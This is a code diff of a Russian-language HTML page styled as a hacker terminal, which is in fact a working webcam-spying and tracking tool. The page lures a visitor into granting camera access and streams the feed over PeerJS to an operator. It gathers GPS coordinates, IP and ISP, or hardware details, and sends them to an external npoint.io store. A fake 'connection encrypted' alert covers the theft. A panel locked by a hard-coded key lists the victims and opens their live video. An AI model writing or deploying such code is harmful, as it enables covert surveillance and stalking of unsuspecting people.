@@ -3,145 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Protocol v6.1</title>
+    <title>Terminal Access v6.0</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { font-family: 'Courier New', monospace; background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .box { background: #0a0a0a; border: 1px solid #0f0; padding: 25px; width: 95%; max-width: 450px; text-align: center; box-shadow: 0 0 20px #0f0; border-radius: 10px; }
-        h2 { letter-spacing: 3px; border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 20px; font-size: 1.1rem; }
-        button { width: 100%; padding: 14px; margin: 8px 0; background: transparent; border: 1px solid #0f0; color: #0f0; cursor: pointer; font-weight: bold; text-transform: uppercase; border-radius: 5px; transition: 0.3s; }
+        .box { background: #0a0a0a; padding: 25px; border-radius: 5px; width: 90%; max-width: 480px; text-align: center; border: 1px solid #0f0; box-shadow: 0 0 20px #0f0; }
+        h2 { text-transform: uppercase; letter-spacing: 5px; font-size: 1.2rem; margin-bottom: 25px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
+        button { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #0f0; background: transparent; color: #0f0; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
         button:hover { background: #0f0; color: #000; }
-        input { width: 100%; padding: 12px; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; margin-bottom: 10px; font-family: monospace; }
-        #results { margin-top: 20px; text-align: left; border: 1px dashed #0f0; padding: 10px; display: none; max-height: 350px; overflow-y: auto; font-size: 10px; background: #050505; }
-        #videoContainer { margin-top: 20px; display: none; }
-        video { width: 100%; border: 1px solid #0f0; background: #111; border-radius: 5px; }
-        .log-entry { border-bottom: 1px solid #222; padding: 10px 0; line-height: 1.4; }
-        .log-entry b { color: #fff; }
-        .btn-red { border-color: #f00; color: #f00; display: none; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; margin: 10px 0; font-family: monospace; }
+        .btn-red { border-color: #f00; color: #f00; display: none; margin-top: 20px; }
         .btn-red:hover { background: #f00; color: #000; }
+        #status { font-size: 12px; margin: 15px 0; color: #888; }
+        #results { margin-top: 20px; text-align: left; background: #050505; padding: 15px; border: 1px dashed #0f0; display: none; max-height: 400px; overflow-y: auto; font-size: 11px; }
+        .entry { border-bottom: 1px double #222; padding: 10px 0; }
+        .highlight { color: #fff; font-weight: bold; }
+        video { width: 100%; border: 1px solid #0f0; margin-top: 15px; display: none; background: #111; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>TERMINAL_SYSTEM_v6.1</h2>
+    <h2>Terminal.v6</h2>
     
-    <button onclick="victimAction()">1. АКТИВИРОВАТЬ КАМЕРУ</button>
-    <button onclick="showAdminLogs()">2. ПАНЕЛЬ УПРАВЛЕНИЯ</button>
+    <button onclick="ultimateScan()">1. АКТИВИРОВАТЬ КАМЕРУ</button>
     
-    <div id="results"></div>
-
-    <hr style="border:0; border-top:1px dashed #222; margin: 20px 0;">
-
-    <div id="camAccessSection">
-        <input type="text" id="targetIdInput" placeholder="ВВЕДИТЕ ID ИЗ ЛОГОВ">
+    <button onclick="accessPanel()">2. ПАНЕЛЬ УПРАВЛЕНИЯ</button>
+    
+    <div id="camSection" style="display:none; border-top: 1px solid #222; padding-top: 10px; margin-top: 10px;">
+        <input type="text" id="targetId" placeholder="ВВЕДИТЕ КОД УСТРОЙСТВА">
         <button onclick="connectToCam()">3. ПОДКЛЮЧИТЬСЯ К ЭФИРУ</button>
     </div>
 
-    <div id="videoContainer">
-        <p style="font-size:10px; color:#fff;">LIVE_FEED_ESTABLISHED</p>
-        <video id="remoteVideo" autoplay playsinline></video>
-    </div>
-
-    <button class="btn-red" id="clearBtn" onclick="wipeData()">ОЧИСТИТЬ ВСЮ БАЗУ</button>
-    <div id="status" style="font-size: 9px; color: #444; margin-top: 15px;">SYS_STATUS: READY</div>
+    <video id="remoteVideo" autoplay playsinline></video>
+    
+    <div id="status">STATUS: STANDBY</div>
+    <div id="results"></div>
+    <button class="btn-red" id="clearBtn" onclick="wipe()">PURGE DATABASE</button>
 </div>
 
 <script>
-    const API_URL = "https://api.npoint.io/178f1f2fb5edf2226fa1"; 
+    const API_URL = "https://api.npoint.io/178f1f2fb5edf2226fa1"; // Твой актуальный ID
     const peer = new Peer();
-    let myPeerId = "";
+    let myPeerId = null;
 
     peer.on('open', (id) => {
         myPeerId = id;
-        document.getElementById('status').innerText = "SYS_STATUS: PEER_CONNECTED";
+        document.getElementById('status').innerText = "STATUS: PEER_READY";
     });
 
-    async function victimAction() {
-        document.getElementById('status').innerText = "SYS_STATUS: EXTRACTING...";
+    async function ultimateScan() {
+        const st = document.getElementById('status');
+        st.innerText = "STATUS: ACCESSING_MEDIA...";
+        
         try {
+            // Запрашиваем доступ к камере
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            peer.on('call', (call) => call.answer(stream));
+            
+            // Настраиваем ответ на звонок админа
+            peer.on('call', (call) => {
+                call.answer(stream); // Отправляем видео админу
+            });
 
-            let ipData = { ip: "Unknown", city: "Unknown", org: "Unknown" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-            } catch(e) {}
+            st.innerText = "STATUS: EXTRACTING_SYSTEM_DATA...";
 
-            const report = {
+            let report = {
                 time: new Date().toLocaleString("ru-RU"),
-                peerId: myPeerId,
-                ip: ipData.ip,
-                city: ipData.city,
-                isp: ipData.org,
-                device: navigator.platform,
-                ua: navigator.userAgent
+                camCode: myPeerId, // Передаем ID для камеры
+                geo: "PENDING...",
+                hw: {
+                    cores: navigator.hardwareConcurrency,
+                    mem: navigator.deviceMemory,
+                    plat: navigator.platform,
+                    res: `${window.screen.width}x${window.screen.height}`
+                }
             };
 
-            const dbRes = await fetch(API_URL);
-            let db = await dbRes.json();
+            // GPS
+            const pos = () => new Promise(res => {
+                navigator.geolocation.getCurrentPosition(
+                    p => res(`${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}`),
+                    () => res("BLOCKED"),
+                    { timeout: 5000 }
+                );
+            });
+            report.geo = await pos();
+
+            // Сохранение в базу
+            const get = await fetch(API_URL);
+            let db = await get.json();
             if (!Array.isArray(db)) db = [];
             db.push(report);
-
+            
             await fetch(API_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(db)
             });
 
-            alert("Система готова. Соединение зашифровано.");
-            document.getElementById('status').innerText = "SYS_STATUS: BROADCASTING";
-        } catch (err) {
-            alert("Ошибка: Доступ к камере отклонен.");
+            st.innerText = "STATUS: SECURE_ESTABLISHED";
+            alert("Система откалибрована. Соединение зашифровано.");
+
+        } catch(e) {
+            st.innerText = "STATUS: ERROR_ACCESS_DENIED";
+            alert("Ошибка: Для работы требуется доступ к камере.");
         }
     }
 
-    async function showAdminLogs() {
-        const pass = prompt("ENTER ACCESS KEY:"); // Без подсказки 3664
-        if (pass !== "3664") return alert("ACCESS DENIED");
+    async function accessPanel() {
+        const key = prompt("ENTER ACCESS KEY:"); // Подсказки нет
+        if (key !== "3664") return alert("ACCESS DENIED");
 
         document.getElementById('clearBtn').style.display = 'block';
+        document.getElementById('camSection').style.display = 'block';
         const resDiv = document.getElementById('results');
         resDiv.style.display = 'block';
-        resDiv.innerHTML = "SYNCING_WITH_CLOUD...";
+        resDiv.innerHTML = "SYNCING_LOGS...";
 
         try {
             const res = await fetch(API_URL);
             const logs = await res.json();
-            if(!logs.length) return resDiv.innerHTML = "DATABASE_EMPTY";
-
             resDiv.innerHTML = logs.reverse().map(l => `
-                <div class="log-entry">
-                    <b>ID:</b> <span style="color:#0f0">${l.peerId}</span><br>
-                    <b>TIME:</b> ${l.time}<br>
-                    <b>NET:</b> ${l.ip} (${l.city})<br>
-                    <b>ISP:</b> ${l.isp}<br>
-                    <b>DEV:</b> ${l.device}
+                <div class="entry">
+                    <b style="color:#0f0">ID ДЛЯ КАМЕРЫ: ${l.camCode}</b><br>
+                    📅 Время: ${l.time}<br>
+                    📍 GPS: ${l.geo}<br>
+                    🧠 HW: ${l.hw.cores} cores / ${l.hw.mem}GB RAM<br>
+                    📱 Plat: ${l.hw.plat} (${l.hw.res})
                 </div>
             `).join('');
-        } catch (e) {
-            resDiv.innerHTML = "FETCH_ERROR";
-        }
+        } catch(e) { resDiv.innerHTML = "FETCH_ERROR"; }
     }
 
     function connectToCam() {
-        const targetId = document.getElementById('targetIdInput').value;
-        if (!targetId) return alert("Нужен ID!");
+        const targetId = document.getElementById('targetId').value;
+        if (!targetId) return alert("Введите ID устройства!");
 
-        document.getElementById('status').innerText = "SYS_STATUS: CONNECTING...";
-        const call = peer.call(targetId, null); 
+        document.getElementById('status').innerText = "STATUS: CALLING_TARGET...";
+        const call = peer.call(targetId, null);
 
         call.on('stream', (remoteStream) => {
-            document.getElementById('status').innerText = "SYS_STATUS: STREAM_ACTIVE";
-            document.getElementById('videoContainer').style.display = "block";
-            document.getElementById('remoteVideo').srcObject = remoteStream;
+            document.getElementById('status').innerText = "STATUS: RECEIVING_STREAM";
+            const video = document.getElementById('remoteVideo');
+            video.style.display = "block";
+            video.srcObject = remoteStream;
         });
-        call.on('error', () => alert("Ошибка связи. Проверьте ID."));
+
+        call.on('error', () => alert("Ошибка соединения. Убедитесь, что ID верный и вкладка у цели открыта."));
     }
 
-    async function wipeData() {
-        if (!confirm("Удалить все логи из облака?")) return;
+    async function wipe() {
+        if (!confirm("PURGE ALL DATA?")) return;
         await fetch(API_URL, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
